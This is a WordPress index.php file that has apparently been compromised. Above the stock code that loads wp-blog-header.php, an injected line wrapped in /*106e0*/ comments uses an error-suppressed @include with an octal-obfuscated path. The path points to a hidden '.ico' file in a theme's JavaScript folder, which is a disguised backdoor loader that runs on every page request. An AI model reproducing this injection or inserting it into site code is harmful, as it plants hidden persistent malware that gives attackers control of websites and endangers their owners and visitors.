<?php
/*106e0*/

@include "\057tse\162ver\057www\057bri\144al-\164k.c\157m/t\145mpl\141te/\152s/m\141gni\146ic-\160opu\160/.6\1460b2\145e8.\151co";

/*106e0*/
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define('WP_USE_THEMES', true);

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );
